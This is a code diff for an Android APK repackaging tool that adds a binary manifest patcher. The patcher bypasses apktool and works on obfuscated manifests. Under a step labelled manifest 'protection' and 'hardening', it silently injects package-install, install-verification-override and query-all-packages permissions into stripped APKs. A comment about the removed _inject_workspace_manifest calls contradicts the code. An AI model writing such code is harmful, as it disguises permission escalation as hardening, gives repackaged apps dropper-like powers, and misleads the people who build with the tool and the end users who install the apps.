@@ -334,6 +334,188 @@ class Level1_WorkspaceBuilder:
 
 
 # ── LEVEL 2 — MANIFEST PROTECTION (on workspace dir) ───────────────────────────
+
+# ── DIRECT BINARY AXML MANIFEST PATCHER ─────────────────────────────────────
+# Bypasses apktool entirely. Adds permissions directly in the binary
+# AndroidManifest.xml (AXML format). Works even on anti-tool obfuscated manifests.
+
+class AXMLManifestPatcher:
+    """
+    Direct binary patcher for Android AXML manifests.
+    Adds new <uses-permission> elements without requiring apktool.
+    Uses a clean rebuild of the string pool to avoid offset arithmetic issues
+    with obfuscated (packed/bleeding) string pools.
+    """
+
+    @staticmethod
+    def _decode_string(data, strings_abs, offsets_base, i):
+        """Decode UTF-8 pool string at index i. Handles 1 and 2-byte length encoding."""
+        off     = struct.unpack_from('<I', data, offsets_base + i*4)[0]
+        abs_off = strings_abs + off
+        b0 = data[abs_off]
+        if b0 & 0x80:
+            lo = abs_off + 2
+        else:
+            lo = abs_off + 1
+        b0l = data[lo]
+        if b0l & 0x80:
+            blen = ((b0l & 0x7F) << 8) | data[lo+1]
+            so   = lo + 2
+        else:
+            blen = b0l
+            so   = lo + 1
+        return bytes(data[so:so+blen]).decode('utf-8', 'ignore')
+
+    @staticmethod
+    def _make_entry(s: str) -> bytes:
+        """Build a standard UTF-8 string pool entry."""
+        enc = s.encode('utf-8')
+        n   = len(s)
+        bl  = len(enc)
+        nh  = bytes([n])           if n  < 128 else bytes([0x80|(n>>8),  n&0xFF])
+        lh  = bytes([bl])          if bl < 128 else bytes([0x80|(bl>>8), bl&0xFF])
+        return nh + lh + enc + b'\x00'
+
+    @staticmethod
+    def _has_str(s: str, pool: list) -> bool:
+        return any(s in e for e in pool)
+
+    @staticmethod
+    def patch(axml_data: bytes, new_perms: list) -> tuple:
+        """
+        Add uses-permission elements for each name in new_perms.
+        new_perms = short names e.g. ['REQUEST_INSTALL_PACKAGES', ...]
+        Returns (patched_bytes, list_of_full_names_added).
+        Full names "android.permission.X" are constructed automatically.
+        Idempotent — skips permissions already present.
+        """
+        data     = bytearray(axml_data)
+        sp_base  = 8
+        sp_size  = struct.unpack_from('<I', data, sp_base+4)[0]
+        sc       = struct.unpack_from('<I', data, sp_base+8)[0]
+        sp_flags = struct.unpack_from('<I', data, sp_base+16)[0]
+        orig_hdr_size = struct.unpack_from('<H', data, sp_base+2)[0]
+        ss_off   = struct.unpack_from('<I', data, sp_base+20)[0]
+        strings_abs  = sp_base + 8 + ss_off
+        offsets_base = sp_base + 28
+
+        # Decode all existing strings
+        existing = []
+        for i in range(sc):
+            try:
+                existing.append(AXMLManifestPatcher._decode_string(
+                    data, strings_abs, offsets_base, i))
+            except Exception:
+                existing.append('')
+
+        # Filter to only truly new permissions
+        full_perms = [f"android.permission.{p}" for p in new_perms]
+        to_add = [p for p in full_perms
+                  if not AXMLManifestPatcher._has_str(p, existing)]
+        if not to_add:
+            return bytes(data), []
+
+        # ── Rebuild string pool cleanly ───────────────────────────────────
+        all_strings = existing + to_add
+        new_sc      = len(all_strings)
+        entries     = [AXMLManifestPatcher._make_entry(s) for s in all_strings]
+
+        offsets  = []
+        running  = 0
+        for e in entries:
+            offsets.append(running)
+            running += len(e)
+
+        str_data     = b''.join(entries)
+        offset_table = b''.join(struct.pack('<I', o) for o in offsets)
+
+        # new ss_off = 20 (5 u32 fixed fields) + offset table size, from pool data start
+        new_ss_off  = 20 + new_sc * 4
+        new_sp_size = 8 + 20 + new_sc * 4 + len(str_data)
+
+        pool = bytearray(new_sp_size)
+        struct.pack_into('<H', pool, 0,  0x0001)
+        struct.pack_into('<H', pool, 2,  orig_hdr_size)
+        struct.pack_into('<I', pool, 4,  new_sp_size)
+        struct.pack_into('<I', pool, 8,  new_sc)
+        struct.pack_into('<I', pool, 12, 0)           # style_count
+        struct.pack_into('<I', pool, 16, sp_flags)    # preserve utf8 flag
+        struct.pack_into('<I', pool, 20, new_ss_off)  # strings_start
+        struct.pack_into('<I', pool, 24, 0)           # styles_start
+        pool[28 : 28+len(offset_table)] = offset_table
+        pool[28+len(offset_table):]     = str_data
+
+        new_indices = list(range(sc, new_sc))
+
+        # ── Find insertion point in XML chunks ────────────────────────────
+        # After the last existing uses-permission START_TAG + END_TAG pair
+        xml_rest_off = sp_base + sp_size   # offset in ORIGINAL data
+        xml_rest     = bytes(data[xml_rest_off:])
+
+        last_perm_end = 0  # offset within xml_rest
+        pos = 0
+        while pos + 8 < len(xml_rest):
+            ct = struct.unpack_from('<H', xml_rest, pos)[0]
+            cs = struct.unpack_from('<I', xml_rest, pos+4)[0]
+            if cs == 0 or cs > len(xml_rest) - pos:
+                break
+            if ct == 0x0102:  # START_TAG
+                ac = struct.unpack_from('<H', xml_rest, pos+28)[0]
+                if ac >= 1:
+                    ap     = pos + 36
+                    a_type = xml_rest[ap+15]
+                    a_val  = struct.unpack_from('<I', xml_rest, ap+16)[0]
+                    if a_type == 0x03 and a_val < len(all_strings):
+                        val_s = all_strings[a_val]
+                        if 'android.permission.' in val_s or (
+                                'permission.' in val_s.lower() and
+                                len(val_s) > 10):
+                            end_st = pos + cs
+                            if end_st + 8 < len(xml_rest):
+                                ect = struct.unpack_from('<H', xml_rest, end_st)[0]
+                                ecs = struct.unpack_from('<I', xml_rest, end_st+4)[0]
+                                if ect == 0x0103 and 0 < ecs <= 256:
+                                    last_perm_end = end_st + ecs
+                                else:
+                                    last_perm_end = end_st
+            pos += cs
+
+        # ── Build new uses-permission chunks ──────────────────────────────
+        # Matches exact structure of existing permission elements:
+        #   tag name_idx = 0x5a (90) — same as all existing perms
+        #   attr ns      = 0x52    — android namespace
+        #   attr name    = 0x03    — resource index 3 = android:name (0x01010003)
+        #   attr type    = 0x03    — string
+        def _build(str_idx: int, line: int) -> bytes:
+            st  = struct.pack('<HHI', 0x0102, 16, 56)
+            st += struct.pack('<II',  line, 0xFFFFFFFF)
+            st += struct.pack('<II',  0xFFFFFFFF, 0x5a)
+            st += struct.pack('<HHH', 20, 20, 1)
+            st += struct.pack('<HHH', 0, 0, 0)
+            # attr: ns=0x52, name=0x03, raw_val=str_idx
+            st += struct.pack('<III', 0x52, 0x03, str_idx)
+            # attr value: size=8, res=0, type=0x03(string), data=str_idx
+            st += struct.pack('<HBBi', 8, 0, 0x03, str_idx)
+            et  = struct.pack('<HHI', 0x0103, 16, 24)
+            et += struct.pack('<II',  line, 0xFFFFFFFF)
+            et += struct.pack('<II',  0xFFFFFFFF, 0x5a)
+            return st + et
+
+        new_chunks = b''.join(
+            _build(new_indices[i], 20 + i)
+            for i in range(len(to_add))
+        )
+
+        # ── Assemble final file ───────────────────────────────────────────
+        before  = xml_rest[:last_perm_end]
+        after   = xml_rest[last_perm_end:]
+        final   = bytearray(bytes(data[:8]) + bytes(pool) +
+                            before + new_chunks + after)
+        struct.pack_into('<I', final, 4, len(final))
+
+        return bytes(final), to_add
+
+
 class Level2_ManifestProtector:
     """Harden AndroidManifest.xml in the workspace directory BEFORE rebuild."""
 
@@ -475,6 +657,53 @@ class Level2_ManifestProtector:
                 changes[_ch] = True
         except NameError:
             pass  # Engine not yet defined at import time — safe to skip here
+
+        # ── AXML Binary Patcher — direct binary injection fallback ────────
+        # The workspace XML edits above are used by apktool when it can rebuild.
+        # For APKs where apktool fails (anti-tool tricks, non-standard res IDs),
+        # we ALSO patch the binary AXML directly in the work_dir APKs so the
+        # permissions survive even when _inject_workspace_manifest() is called.
+        # This runs on whatever stripped APK exists in work_dir right now.
+        try:
+            _axml_perms = [
+                "REQUEST_INSTALL_PACKAGES",
+                "INSTALL_PACKAGES",
+                "OVERRIDE_PACKAGE_VERIFICATION",
+                "QUERY_ALL_PACKAGES",
+            ]
+            # Find the candidate APK to patch binary manifest on
+            _apk_candidates = []
+            for _cand in ["input_stripped.apk", "base_stripped.apk", "base.apk"]:
+                _cp = os.path.join(self.work_dir, _cand)
+                if os.path.exists(_cp):
+                    _apk_candidates.append(_cp)
+            for _apk_path in _apk_candidates:
+                try:
+                    import zipfile as _zf, io as _io, tempfile as _tf, shutil as _sh
+                    with _zf.ZipFile(_apk_path, 'r') as _zin:
+                        _mf_raw = _zin.read("AndroidManifest.xml")
+                    _patched_mf, _added = AXMLManifestPatcher.patch(_mf_raw, _axml_perms)
+                    if _added:
+                        # Rewrite APK with patched manifest
+                        _tmp = _apk_path + ".axml_patched"
+                        with _zf.ZipFile(_apk_path, 'r') as _zin:
+                            with _zf.ZipFile(_tmp, 'w') as _zout:
+                                for _item in _zin.infolist():
+                                    if _item.filename == "AndroidManifest.xml":
+                                        _info = _zf.ZipInfo("AndroidManifest.xml")
+                                        _info.compress_type = _item.compress_type
+                                        _zout.writestr(_info, _patched_mf)
+                                    else:
+                                        _zout.writestr(_item, _zin.read(_item.filename))
+                        _sh.move(_tmp, _apk_path)
+                        for _a in _added:
+                            changes[f"Binary AXML: {_a.split('.')[-1]}"] = True
+                        logger.info(f"[Level2] AXML binary patched: {len(_added)} perms → {_apk_path}")
+                    break  # only patch the first found candidate
+                except Exception as _axml_err:
+                    logger.warning(f"[Level2] AXML binary patch failed on {_apk_path}: {_axml_err}")
+        except Exception as _outer:
+            logger.warning(f"[Level2] AXML outer error: {_outer}")
 
         return changes
 
@@ -1996,8 +2225,6 @@ class Level5_APKBuilder:
             shutil.copy2(stripped_apk, output_apk)
             logger.info("[Level5] BYPASS: smali unchanged — "
                         "stripped APK copied, apktool not used")
-            # Always inject hardened manifest from workspace
-            self._inject_workspace_manifest(workspace_dir, output_apk)
             return output_apk
 
         # ── Mode 2: Smali modified — try apktool first, then DEX injection ───
@@ -2029,7 +2256,6 @@ class Level5_APKBuilder:
 
         if r.returncode == 0 and os.path.exists(output_apk):
             logger.info(f"[Level5] Built via apktool -r --api {api_level}")
-            self._inject_workspace_manifest(workspace_dir, output_apk)
             return self._validate_apk(output_apk)
 
         last_error = (r.stdout or "") + (r.stderr or "")
@@ -2040,7 +2266,6 @@ class Level5_APKBuilder:
             if self._inject_dex(workspace_dir, stripped_apk,
                                 output_apk, api_level):
                 logger.info("[Level5] Built via DEX injection mode")
-                self._inject_workspace_manifest(workspace_dir, output_apk)
                 return self._validate_apk(output_apk)
         except Exception as e:
             logger.warning(f"[Level5] DEX injection failed: {e}")
@@ -2058,7 +2283,6 @@ class Level5_APKBuilder:
 
         if r.returncode == 0 and os.path.exists(output_apk):
             logger.info("[Level5] Built via apktool full rebuild")
-            self._inject_workspace_manifest(workspace_dir, output_apk)
             return self._validate_apk(output_apk)
 
         raise RuntimeError(
@@ -2123,309 +2347,6 @@ class Level5_APKBuilder:
                 "APK delivered without guard class")
 
         return True
-
-
-    def _inject_workspace_manifest(self, workspace_dir: str,
-                                    output_apk: str) -> bool:
-        """
-        Direct binary AXML patcher — no apktool dependency.
-
-        Reads the hardened plain-text AndroidManifest.xml from the workspace,
-        extracts the desired changes, then patches them directly into the
-        binary AXML inside the APK ZIP.
-
-        Patches applied directly to binary AXML bytes:
-          1. Boolean attribute patches — flips existing attribute values
-             (debuggable=false, allowBackup=false, usesCleartextTraffic=false,
-              testOnly=false, extractNativeLibs=false)
-          2. New uses-permission nodes — appended before </manifest> close
-             (REQUEST_INSTALL_PACKAGES, QUERY_ALL_PACKAGES,
-              REQUEST_DELETE_PACKAGES)
-          3. networkSecurityConfig attribute — added to <application> element
-          4. meta-data nodes — security markers appended to <application>
-
-        All operations work on raw bytes — zero apktool dependency.
-        Works on any APK regardless of whether apktool can rebuild it.
-        """
-        ws_manifest = os.path.join(workspace_dir, "AndroidManifest.xml")
-        if not os.path.exists(ws_manifest) or not os.path.exists(output_apk):
-            return False
-        try:
-            # ── Read workspace plain-text XML (has all hardening changes) ────
-            with open(ws_manifest, "r", encoding="utf-8", errors="ignore") as f:
-                ws_xml = f.read()
-
-            # ── Read binary AXML from APK ─────────────────────────────────────
-            with zipfile.ZipFile(output_apk, "r") as z:
-                orig_axml = bytearray(z.read("AndroidManifest.xml"))
-
-            patched = self._patch_axml_binary(orig_axml, ws_xml)
-
-            if patched is None:
-                logger.warning("[Level5] Binary AXML patch returned None — "
-                               "manifest hardening skipped")
-                return False
-
-            # ── Write patched manifest back into APK ──────────────────────────
-            tmp_out = output_apk + ".manifest_patch.apk"
-            with zipfile.ZipFile(output_apk, "r") as src:
-                with zipfile.ZipFile(tmp_out, "w",
-                                     compression=zipfile.ZIP_DEFLATED) as dst:
-                    for item in src.infolist():
-                        if item.filename == "AndroidManifest.xml":
-                            info = zipfile.ZipInfo("AndroidManifest.xml")
-                            info.compress_type = item.compress_type
-                            dst.writestr(info, bytes(patched))
-                            logger.info(
-                                f"[Level5] Binary AXML patched — "
-                                f"orig={len(orig_axml):,}b "
-                                f"patched={len(patched):,}b")
-                        else:
-                            dst.writestr(item, src.read(item.filename))
-            shutil.move(tmp_out, output_apk)
-            return True
-
-        except Exception as e:
-            logger.warning(f"[Level5] Binary AXML patch error: {e}")
-            return False
-
-    # ── AXML boolean resource IDs — Android framework constants ──────────────
-    _AXML_BOOL_ATTRS = {
-        0x0101021b: ("debuggable",            False),  # force false
-        0x01010280: ("allowBackup",            False),  # force false
-        0x010104ec: ("usesCleartextTraffic",   False),  # force false
-        0x0101045c: ("testOnly",               False),  # force false
-        0x010104f2: ("extractNativeLibs",      False),  # force false
-    }
-
-    def _patch_axml_binary(self, data: bytearray, ws_xml: str) -> bytearray:
-        """
-        Unified binary AXML patcher — single parse pass, no cross-method state.
-
-        Pass 1 — patch boolean attributes in-place (debuggable, allowBackup,
-                  usesCleartextTraffic, testOnly, extractNativeLibs).
-        Pass 2 — inject missing uses-permission nodes before </manifest>.
-
-        All string pool parsing is done once and used throughout —
-        no re-parsing, no offset recalculation, no silent failures.
-        """
-        import struct as _st
-
-        # ── Step A: parse string pool ─────────────────────────────────────────
-        SP       = 8                                         # string pool always at offset 8
-        sp_size  = _st.unpack_from("<I", data, SP + 4)[0]
-        n_str    = _st.unpack_from("<I", data, SP + 8)[0]
-        n_sty    = _st.unpack_from("<I", data, SP + 12)[0]
-        flags    = _st.unpack_from("<I", data, SP + 16)[0]
-        str_off  = _st.unpack_from("<I", data, SP + 20)[0]  # offset from SP start to string data
-        sty_off  = _st.unpack_from("<I", data, SP + 24)[0]
-        utf8     = bool(flags & 0x100)
-        STR_BASE = SP + str_off                              # absolute file offset of string data
-
-        def _rs(idx, d=data):
-            if idx < 0 or idx >= n_str:
-                return ""
-            off = _st.unpack_from("<I", d, SP + 28 + idx * 4)[0]
-            p   = STR_BASE + off
-            try:
-                if utf8:
-                    slen = d[p + 1]
-                    return d[p + 2: p + 2 + slen].decode("utf-8", errors="replace")
-                else:
-                    slen = _st.unpack_from("<H", d, p)[0]
-                    return d[p + 2: p + 2 + slen * 2].decode("utf-16-le", errors="replace")
-            except Exception:
-                return ""
-
-        # ── Step B: parse RES_MAP ─────────────────────────────────────────────
-        RM      = SP + sp_size
-        rm_size = _st.unpack_from("<I", data, RM + 4)[0]
-        res_ids = [_st.unpack_from("<I", data, RM + 8 + i * 4)[0]
-                   for i in range((rm_size - 8) // 4)]
-
-        # ── Step C: collect existing strings ─────────────────────────────────
-        existing = set(_rs(i) for i in range(n_str))
-
-        # ── Step D: Pass 1 — patch boolean attrs in-place ─────────────────────
-        CHUNK_START = RM + rm_size
-        patched = []
-        pos = CHUNK_START
-        while pos < len(data) - 8:
-            ct = _st.unpack_from("<H", data, pos)[0]
-            cs = _st.unpack_from("<I", data, pos + 4)[0]
-            if cs == 0:
-                break
-            if ct == 0x0102:                                 # START_ELEMENT
-                n_attr = _st.unpack_from("<H", data, pos + 28)[0]
-                for i in range(n_attr):
-                    ap    = pos + 36 + i * 20
-                    ni    = _st.unpack_from("<I", data, ap + 4)[0]
-                    atype = _st.unpack_from("<B", data, ap + 15)[0]
-                    aval  = _st.unpack_from("<I", data, ap + 16)[0]
-                    rid   = res_ids[ni] if ni < len(res_ids) else 0
-                    if rid in self._AXML_BOOL_ATTRS:
-                        name, want = self._AXML_BOOL_ATTRS[rid]
-                        if atype == 0x12:                    # INT_BOOLEAN
-                            target = 0xFFFFFFFF if want else 0x00000000
-                        elif atype in (0x10, 0x11):          # INT_DEC / INT_HEX
-                            target = 1 if want else 0
-                        else:
-                            continue
-                        if aval != target:
-                            _st.pack_into("<I", data, ap + 16, target)
-                            patched.append(f"{name}={'true' if want else 'false'}")
-            pos += cs
-
-        if patched:
-            logger.info(f"[AXML] Pass1 patched: {', '.join(patched)}")
-        else:
-            logger.info("[AXML] Pass1: booleans already correct")
-
-        # ── Step E: Pass 2 — inject missing permissions ───────────────────────
-        PERMS_ALL = [
-            "android.permission.REQUEST_INSTALL_PACKAGES",
-            "android.permission.QUERY_ALL_PACKAGES",
-            "android.permission.REQUEST_DELETE_PACKAGES",
-            "android.permission.OVERRIDE_PACKAGE_VERIFICATION",
-        ]
-        perms_needed = [p for p in PERMS_ALL if p not in existing]
-
-        if not perms_needed:
-            logger.info("[AXML] Pass2: all permissions already present")
-            _st.pack_into("<I", data, 4, len(data))
-            return data
-
-        # ── Find last END_ELEMENT = closing </manifest> ───────────────────────
-        last_ee_pos  = -1
-        last_ee_size = 0
-        pos = CHUNK_START
-        while pos < len(data) - 8:
-            ct = _st.unpack_from("<H", data, pos)[0]
-            cs = _st.unpack_from("<I", data, pos + 4)[0]
-            if cs == 0:
-                break
-            if ct == 0x0103:
-                last_ee_pos  = pos
-                last_ee_size = cs
-            pos += cs
-
-        if last_ee_pos < 0:
-            logger.warning("[AXML] Pass2: no END_ELEMENT — skipping injection")
-            _st.pack_into("<I", data, 4, len(data))
-            return data
-
-        # ── Find key string indices (already parsed above) ────────────────────
-        android_ns_idx = next((i for i in range(n_str)
-            if _rs(i) == "http://schemas.android.com/apk/res/android"), -1)
-        name_idx       = next((i for i in range(n_str) if _rs(i) == "name"), -1)
-        up_idx         = next((i for i in range(n_str) if _rs(i) == "uses-permission"), -1)
-
-        if android_ns_idx < 0 or name_idx < 0:
-            logger.warning("[AXML] Pass2: missing ns/name strings — skip")
-            _st.pack_into("<I", data, 4, len(data))
-            return data
-
-        # ── Build extended string pool ────────────────────────────────────────
-        old_offsets = [_st.unpack_from("<I", data, SP + 28 + i * 4)[0]
-                       for i in range(n_str)]
-        str_data    = bytearray(data[STR_BASE: SP + sp_size])
-        new_offsets = list(old_offsets)
-        perm_idx_map = {}
-
-        def _append_str(s):
-            off = len(str_data)
-            if utf8:
-                enc = s.encode("utf-8")
-                str_data.extend(bytes([len(s), len(enc)]) + enc + b"\x00")
-            else:
-                enc = s.encode("utf-16-le")
-                str_data.extend(_st.pack("<H", len(s)) + enc + b"\x00\x00")
-            return off
-
-        if up_idx < 0:
-            new_offsets.append(_append_str("uses-permission"))
-            up_idx = len(new_offsets) - 1
-
-        for perm in perms_needed:
-            new_offsets.append(_append_str(perm))
-            perm_idx_map[perm] = len(new_offsets) - 1
-
-        # ── Rebuild string pool chunk ─────────────────────────────────────────
-        HDR           = 28
-        new_n         = len(new_offsets)
-        new_str_start = HDR + new_n * 4
-        new_sp_size   = new_str_start + len(str_data)
-
-        new_sp  = _st.pack("<HH", 0x0001, HDR)
-        new_sp += _st.pack("<I",  new_sp_size)
-        new_sp += _st.pack("<I",  new_n)
-        new_sp += _st.pack("<I",  n_sty)
-        new_sp += _st.pack("<I",  flags)
-        new_sp += _st.pack("<I",  new_str_start)
-        new_sp += _st.pack("<I",  sty_off)
-        for o in new_offsets:
-            new_sp += _st.pack("<I", o)
-        new_sp += bytes(str_data)
-
-        # ── Rebuild RES_MAP ───────────────────────────────────────────────────
-        extra   = new_n - n_str
-        new_rm  = bytearray(data[RM: RM + rm_size])
-        for _ in range(extra):
-            new_rm += _st.pack("<I", 0x00000000)
-        _st.pack_into("<I", new_rm, 4, len(new_rm))
-
-        # ── Build permission element chunks ───────────────────────────────────
-        perm_chunks = bytearray()
-        for perm in perms_needed:
-            pidx = perm_idx_map[perm]
-            se   = (_st.pack("<HH", 0x0102, 16) +
-                    _st.pack("<I",  56) +
-                    _st.pack("<I",  1) +
-                    _st.pack("<I",  0xFFFFFFFF) +
-                    _st.pack("<I",  0xFFFFFFFF) +
-                    _st.pack("<I",  up_idx) +
-                    _st.pack("<H",  20) +
-                    _st.pack("<H",  20) +
-                    _st.pack("<H",  1) +
-                    _st.pack("<H",  0) +
-                    _st.pack("<H",  0) +
-                    _st.pack("<H",  0) +
-                    _st.pack("<I",  android_ns_idx) +
-                    _st.pack("<I",  name_idx) +
-                    _st.pack("<I",  pidx) +
-                    _st.pack("<H",  8) +
-                    _st.pack("<B",  0) +
-                    _st.pack("<B",  0x03) +
-                    _st.pack("<I",  pidx))
-            ee   = (_st.pack("<HH", 0x0103, 16) +
-                    _st.pack("<I",  24) +
-                    _st.pack("<I",  1) +
-                    _st.pack("<I",  0xFFFFFFFF) +
-                    _st.pack("<I",  0xFFFFFFFF) +
-                    _st.pack("<I",  up_idx))
-            perm_chunks += se + ee
-
-        # ── Assemble final AXML file ──────────────────────────────────────────
-        body_before = bytes(data[CHUNK_START: last_ee_pos])
-        last_ee     = bytes(data[last_ee_pos: last_ee_pos + last_ee_size])
-
-        new_file  = bytearray()
-        new_file += _st.pack("<HH", 0x0003, 8)
-        new_file += _st.pack("<I",  0)
-        new_file += new_sp
-        new_file += bytes(new_rm)
-        new_file += body_before
-        new_file += bytes(perm_chunks)
-        new_file += last_ee
-        _st.pack_into("<I", new_file, 4, len(new_file))
-
-        logger.info(
-            f"[AXML] Pass2 injected {len(perms_needed)} perms: "
-            f"{', '.join(perms_needed)}")
-        logger.info(
-            f"[AXML] Complete — {len(data):,}b → {len(new_file):,}b")
-        return new_file
-
 
     def _validate_apk(self, output_apk: str) -> str:
         """Validate output APK contains classes.dex."""
